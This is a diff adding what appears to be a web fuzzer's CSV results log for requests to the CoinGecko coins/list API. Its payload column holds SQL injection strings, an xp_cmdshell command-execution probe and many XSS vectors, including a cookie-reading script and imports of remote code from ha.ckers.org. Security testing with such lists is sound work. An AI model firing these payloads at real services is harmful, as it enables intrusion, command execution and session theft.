@@ -1,0 +1,35 @@
+Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
+0,Original,Thu Feb 27 21:41:02 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,345,253,0,1057,1007896,,,[]
+1,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,155,320,1,1057,1007896,,Reflected,[a]
+16,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,403,Forbidden,212,321,49,1694,9035,,,['; exec master..xp_cmdshell 'ping 172.10.1.255'--]
+7,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,403,Forbidden,238,321,20,1694,8587,,,[' and 1=0) union all]
+12,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,403,Forbidden,267,321,43,1694,8608,,,[x' and 1=(select count(*) from tabname); --]
+17,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,330,320,8,1057,1007896,,,[alert(1)]
+13,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,495,321,32,1057,1007896,,,[x' and members.email is NULL; --]
+15,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,495,321,13,1057,1007896,,,[23 or 1=1; --]
+9,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,554,321,25,1057,1007896,,,[x' and userid is NULL; --]
+11,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,564,321,19,1057,1007896,,,[anything' or 'x'='x]
+4,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,594,321,13,1057,1007896,,,[a' or 1=1; --]
+10,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,636,321,24,1057,1007896,,,[x' and email is NULL; --]
+8,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,593,321,11,1057,1007896,,,[? or 1=1 --]
+2,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,600,320,3,1057,1007896,,,[a' ]
+18,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,423,321,12,1057,1007896,,,[A=alert;A(1)]
+5,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,640,320,1,1057,1007896,,Reflected,[@]
+3,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,640,320,5,1057,1007896,,,[a' --]
+14,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,652,321,27,1057,1007896,,,[x' or full_name like '%bob%]
+6,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,667,320,1,1057,1007896,,Reflected,[?]
+19,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,415,321,10,1057,1007896,,,[+alert(0)+]
+20,Fuzzed,Thu Feb 27 22:16:04 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,412,321,32,1057,1007896,,,[';//%0da=eval;b=alert;a(b(9));//]
+30,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,403,Forbidden,123,322,222,355,4520,,,"[<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""xss<script defer>alert('xss')</script>""> </body></html>]"
+28,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,403,Forbidden,105,322,135,1694,9120,,,"[<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x></xml><span datasrc=#i datafld=c dataformatas=html>]"
+23,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,281,321,29,1057,1007896,,,[1};a=eval;b=alert;a(b(14));//]
+31,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,403,Forbidden,115,322,115,1694,8672,,,"[<html xmlns:xss><?import namespace=""xss"" implementation=""httP://ha.ckers.org/xss.htc""><xss:xss>xss</xss:xss></html>]"
+33,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,403,Forbidden,126,322,136,1694,8694,,,"[<?xml version=""1.0""?><html:html xmlns:html='httP://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>]"
+32,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,403,Forbidden,127,322,106,1694,8651,,,"[<xml src=""httP://ha.ckers.org/xsstest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>]"
+21,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,338,321,30,1057,1007896,,,[a=1;a=eval;b=alert;a(b(11));//]
+22,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,328,321,29,1057,1007896,,,['};a=eval;b=alert;a(b(13));//]
+29,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,403,Forbidden,168,322,137,1694,8694,,,"[<xml id=""xss""><i><b><img src=""javas<!-- -->cript:alert('xss')""></b></i></xml><span datasrc=""#xss"" datafld=""b"" dataformatas=""html""></span>]"
+25,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,295,321,29,1057,1007896,,,[1];a=eval;b=alert;a(b(17));//]
+24,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,363,321,29,1057,1007896,,,['];a=eval;b=alert;a(b(15));//]
+26,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,270,321,34,1057,1007896,,,[1;a=eval;b=alert;a(b(/c/.source));]
+27,Fuzzed,Thu Feb 27 22:16:05 BRT 2025,GET,https://api.coingecko.com/api/v3/coins/list,200,OK,268,321,21,1057,1007896,,,[xyz onerror=alert(6);]
